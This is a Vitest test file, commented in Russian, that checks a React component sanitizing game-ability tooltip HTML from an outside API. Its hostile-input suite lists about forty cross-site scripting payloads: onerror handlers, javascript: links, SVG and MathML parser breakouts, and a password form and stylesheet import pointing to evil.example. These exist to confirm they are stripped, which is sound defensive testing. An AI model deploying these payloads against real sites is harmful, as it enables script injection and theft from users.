// @vitest-environment jsdom
// Описания способностей приходят из стороннего API в виде HTML. Здесь проверяется весь путь «строка → разбор DOM →
// элементы React → разметка страницы»: настоящие описания должны сохранить оформление и текст, а подборка
// атакующих строк — не оставить в разметке ни скрипта, ни обработчика, ни ссылки наружу.
import { Fragment, createElement } from 'react'
import { renderToStaticMarkup } from 'react-dom/server'
import { describe, expect, it } from 'vitest'
import TooltipHtml from '../src/components/ui/TooltipHtml.jsx'
import samples from './fixtures/ability-descriptions.json'

const render = (html, className = 'desc') => renderToStaticMarkup(createElement(TooltipHtml, { html, className }))
const parse = (markup) => new globalThis.DOMParser().parseFromString(markup, 'text/html').body
const textOf = (markup) => parse(markup).textContent.replace(/\s+/g, ' ').trim()

const ALLOWED_ELEMENTS = new Set([
  'div', 'span', 'br', 'b', 'strong', 'i', 'em', 'u', 'img',
  'svg', 'g', 'path', 'rect', 'circle', 'ellipse', 'line', 'polyline', 'polygon', 'defs', 'clippath',
])
const ALLOWED_ATTRIBUTES = new Set([
  'class', 'style', 'src', 'alt', 'loading', 'decoding', 'referrerpolicy', 'aria-hidden', 'focusable',
  'width', 'height', 'viewbox', 'fill', 'stroke', 'fill-opacity', 'stroke-opacity', 'opacity', 'fill-rule', 'clip-rule',
  'stroke-width', 'stroke-linecap', 'stroke-linejoin', 'd', 'points', 'transform',
  'x', 'y', 'rx', 'ry', 'cx', 'cy', 'r', 'x1', 'y1', 'x2', 'y2', 'id', 'clip-path',
])

/** Что бы ни пришло на вход, в готовой разметке — только известные элементы и атрибуты и ни одной ссылки наружу. */
function expectSafe(markup) {
  const body = parse(markup)
  // div — только обёртка самого компонента: внутри описания div не бывает (иначе разворачивался бы чужой элемент)
  expect(body.querySelectorAll('div').length).toBe(1)
  for (const element of body.querySelectorAll('*')) {
    expect(ALLOWED_ELEMENTS.has(element.localName.toLowerCase()), `элемент <${element.localName}>`).toBe(true)
    for (const attribute of element.attributes) {
      const name = attribute.name.toLowerCase()
      expect(ALLOWED_ATTRIBUTES.has(name), `атрибут ${attribute.name} у <${element.localName}>`).toBe(true)
      expect(/javascript:|vbscript:|data:/i.test(attribute.value), `${attribute.name}="${attribute.value}"`).toBe(false)
    }
    if (element.localName === 'img') {
      expect(element.getAttribute('src')).toMatch(/^https:\/\/assets-bucket\.deadlock-api\.com\/assets-api-res\/images\//)
    }
    const style = element.getAttribute('style')
    if (style !== null) expect(style, 'style').toMatch(/^color:\s*[#\w]+;?$/)
  }
  expect(markup).not.toMatch(/<(script|iframe|object|embed|form|foreignobject|use|style|a|link|meta|base|math|template|noscript)[\s>/]/i)
  expect(markup).not.toMatch(/\son[a-z]+\s*=/i)
}

describe('TooltipHtml on real ability descriptions', () => {
  it('has a sample of every kind of markup the API really sends', () => {
    const all = samples.map((sample) => sample.html).join('\n')
    for (const needle of ['<svg', '<clipPath', '<rect', '<path', '<img', '<Panel', '<br', '&amp;', 'style="color', 'class="highlight"', 'class="diminish"', 'highlight_spirit', 'inline-attribute']) {
      expect(all, needle).toContain(needle)
    }
    expect(samples.some((sample) => sample.language === 'russian')).toBe(true)
  })

  it.each(samples.map((sample) => [sample.label, sample]))('%s: markup is safe and the text survives intact', (_label, sample) => {
    const markup = render(sample.html)
    expectSafe(markup)
    expect(textOf(markup)).toBe(textOf(sample.html))
  })

  it.each(samples.map((sample) => [sample.label, sample]))('%s: every class and color of the original is kept in the same order', (_label, sample) => {
    const classes = (markup) => [...parse(markup).querySelectorAll('span, img')].map((element) => element.getAttribute('class'))
    const colors = (markup) => [...parse(markup).querySelectorAll('span')].map((element) => /color:\s*([#\w]+)/i.exec(element.getAttribute('style') ?? '')?.[1] ?? null)
    expect(classes(render(sample.html))).toEqual(classes(sample.html))
    expect(colors(render(sample.html))).toEqual(colors(sample.html))
  })

  it('keeps the icons: same shapes, same path data, camel-cased clipPath, aria-hidden', () => {
    const sample = samples.find((item) => item.html.includes('<clipPath'))
    const markup = render(sample.html)
    const input = parse(sample.html)
    const output = parse(markup)

    expect(output.querySelectorAll('svg').length).toBe(input.querySelectorAll('svg').length)
    expect([...output.querySelectorAll('path')].map((path) => path.getAttribute('d'))).toEqual([...input.querySelectorAll('path')].map((path) => path.getAttribute('d')))
    expect(markup).toContain('<clipPath') // у чужого парсера (jsdom) и у браузера регистр один: clipPath, а не clippath
    expect(output.querySelector('svg').getAttribute('aria-hidden')).toBe('true')
    expect(output.querySelector('svg').getAttribute('viewBox') ?? output.querySelector('svg').getAttribute('viewbox')).toBe(input.querySelector('svg').getAttribute('viewBox') ?? input.querySelector('svg').getAttribute('viewbox'))
    expect(output.querySelector('rect').getAttribute('transform')).toBe('translate(4 10)')
  })

  it('renames ids and the references to them together, so they point inside this description', () => {
    const sample = samples.find((item) => item.html.includes('<clipPath'))
    const body = parse(render(sample.html))
    const ids = [...body.querySelectorAll('[id]')].map((element) => element.getAttribute('id'))
    const references = [...body.querySelectorAll('[clip-path]')].map((element) => /^url\(#(.+)\)$/.exec(element.getAttribute('clip-path'))?.[1])
    expect(ids.length).toBeGreaterThan(0)
    expect(ids.every((id) => /^tt[A-Za-z0-9]+-clip/.test(id))).toBe(true)
    expect(references.length).toBeGreaterThan(0)
    for (const reference of references) expect(ids).toContain(reference)
  })

  it('gives two descriptions with the same icon different ids (they used to share one and point at each other)', () => {
    const sample = samples.find((item) => item.html.includes('<clipPath'))
    const markup = renderToStaticMarkup(createElement(Fragment, null,
      createElement(TooltipHtml, { html: sample.html }),
      createElement(TooltipHtml, { html: sample.html })))
    const ids = [...parse(markup).querySelectorAll('[id]')].map((element) => element.getAttribute('id'))
    expect(ids.length).toBeGreaterThanOrEqual(2)
    expect(new Set(ids).size).toBe(ids.length)
  })

  it('unwraps the unclosed <Panel> from the game interface but keeps what is inside', () => {
    const sample = samples.find((item) => item.html.includes('<Panel'))
    const markup = render(sample.html)
    expect(markup.toLowerCase()).not.toContain('<panel')
    expect(textOf(markup)).toBe(textOf(sample.html))
  })

  it('escapes an ampersand once, not twice', () => {
    const sample = samples.find((item) => item.html.includes('&amp;'))
    const markup = render(sample.html)
    expect(markup).toContain('&amp;')
    expect(markup).not.toContain('&amp;amp;')
    expect(textOf(markup)).toContain('Bullet, Spirit & Melee')
  })

  it('draws the inline icons as decorative images from the API storage', () => {
    const sample = samples.find((item) => item.html.includes('<img'))
    const images = [...parse(render(sample.html)).querySelectorAll('img')]
    expect(images.length).toBeGreaterThan(0)
    for (const image of images) {
      expect(image.getAttribute('alt')).toBe('') // подпись рядом, дублировать её скринридеру не нужно
      expect(image.getAttribute('loading')).toBe('lazy')
      expect(image.getAttribute('referrerpolicy')).toBe('no-referrer')
    }
  })
})

describe('TooltipHtml on hostile input', () => {
  const attacks = {
    'img with onerror': '<img src=x onerror=alert(1)>',
    'img onerror on an allowed host': '<img src="https://assets-bucket.deadlock-api.com/assets-api-res/images/a.png" onerror="alert(1)" onload="alert(2)">',
    'img from another host': '<img src="https://evil.example/pixel.png">',
    'img from a look-alike host': '<img src="https://assets-bucket.deadlock-api.com.evil.example/assets-api-res/images/a.png">',
    'img with a protocol-relative address': '<img src="//evil.example/pixel.png">',
    'img with a data address': '<img src="data:image/svg+xml,<svg onload=alert(1)>">',
    'span with an event': '<span onmouseover="alert(1)" onclick="alert(2)" class="highlight">hover</span>',
    'span with a hostile style': '<span style="position:fixed;inset:0;background:url(javascript:alert(1))">cover</span>',
    'span with expression()': '<span style="color: expression(alert(1))">x</span>',
    'span with a color and more': '<span style="color: red; position: fixed">x</span>',
    'span with the site’s own classes': '<span class="search-overlay nav__drawer btn">x</span>',
    'script tag': '<script>alert(1)</script>after',
    'script in a span': '<span><script>alert(1)</script>after</span>',
    'upper case and slashes': '<IMG SRC=x ONERROR=alert(1)><img/src=x/onerror=alert(1)>',
    'link with javascript:': '<a href="javascript:alert(1)">click</a>',
    'link with an entity-encoded scheme': '<a href="&#106;avascript:alert(1)">click</a>',
    'link to another site': '<a href="https://evil.example/">click</a>',
    'iframe': '<iframe src="javascript:alert(1)"></iframe><iframe srcdoc="<script>alert(1)</script>"></iframe>',
    'object and embed': '<object data="javascript:alert(1)"></object><embed src="javascript:alert(1)">',
    'form': '<form action="https://evil.example/"><input name="password"><button>go</button></form>',
    'svg with onload': '<svg onload=alert(1) width="10" height="10"><path d="M0 0L1 1" onclick="alert(1)"/></svg>',
    'svg script': '<svg><script>alert(1)</script></svg>',
    'svg style': '<svg><style>@import url(//evil.example/x.css);</style><path d="M0 0"/></svg>',
    'svg foreignObject': '<svg><foreignObject><div onclick="alert(1)">x</div><img src=x onerror=alert(1)></foreignObject></svg>',
    'svg use': '<svg><use href="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=#a"/><use xlink:href="https://evil.example/x.svg#a"/></svg>',
    'svg image': '<svg><image href="https://evil.example/x.png"/><image xlink:href="javascript:alert(1)"/></svg>',
    'svg link': '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
    'svg animation': '<svg><animate onbegin="alert(1)" attributeName="x"/><set attributeName="onmouseover" to="alert(1)"/></svg>',
    'svg with hostile paint': '<svg><path d="M0 0" fill="url(javascript:alert(1))" stroke="javascript:alert(1)"/></svg>',
    'svg with hostile path data': '<svg><path d="M0 0 <script>alert(1)</script>"/></svg>',
    'svg clip-path to another site': '<svg><g clip-path="url(https://evil.example/x.svg#a)"><path d="M0 0"/></g></svg>',
    'svg that breaks out into html': '<svg></p><style><a title="</style><img src onerror=alert(1)>">',
    'math with a link': '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
    'math with html inside': '<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>',
    'noscript trick': '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
    'template': '<template><img src=x onerror=alert(1)></template>',
    'comment': '<!--<img src=x onerror=alert(1)>--><span>ok</span>',
    'cdata': '<![CDATA[<img src=x onerror=alert(1)>]]>',
    'meta, base and link': '<meta http-equiv="refresh" content="0;url=javascript:alert(1)"><base href="https://evil.example/"><link rel="stylesheet" href="https://evil.example/x.css">',
    'dangling markup': '<img src="https://evil.example/?',
    'path outside svg': '<path d="M0 0" onclick="alert(1)"/><rect width="9999"/>',
  }

  it.each(Object.entries(attacks))('%s', (_name, payload) => {
    expectSafe(render(payload))
  })

  it('shows only the harmless text of an attack, never its code', () => {
    expect(textOf(render('<script>alert(1)</script>after'))).toBe('after')
    expect(textOf(render('<span><script>alert(1)</script>after</span>'))).toBe('after')
    expect(textOf(render('<a href="javascript:alert(1)">click</a>'))).toBe('click')
    expect(textOf(render('<svg><foreignObject><div>secret</div></foreignObject></svg>after'))).toBe('after')
    expect(textOf(render('<!--hidden--><span>ok</span>'))).toBe('ok')
  })

  it('does not let a span carry the site’s own class or any style but the text color', () => {
    const body = parse(render('<span class="search-overlay highlight" style="position:fixed">x</span><span style="color:#0F9">y</span>'))
    const [first, second] = body.querySelectorAll('span')
    expect(first.getAttribute('class')).toBe('highlight')
    expect(first.hasAttribute('style')).toBe(false)
    expect(second.getAttribute('style')).toMatch(/color:\s*#0F9/)
  })

  it('stays within bounds on a nesting bomb and on a flood of elements', () => {
    const deep = render(`${'<span>'.repeat(400)}deep${'</span>'.repeat(400)}`)
    let depth = 0
    for (let element = parse(deep).querySelector('div'); element; element = element.querySelector('span')) depth += 1
    expect(depth).toBeLessThanOrEqual(14)

    const flood = render('<span>x</span>'.repeat(20_000))
    expect(parse(flood).querySelectorAll('span').length).toBeLessThan(1000)
    expect(flood.length).toBeLessThan(100_000)
  })

  it('renders nothing for an empty description and keeps the wrapper class', () => {
    for (const empty of [undefined, null, '']) expect(render(empty)).toBe('<div class="desc"></div>')
    expect(renderToStaticMarkup(createElement(TooltipHtml, { html: 'x' }))).toBe('<div>x</div>')
    expect(render(42)).toBe('<div class="desc">42</div>')
  })
})
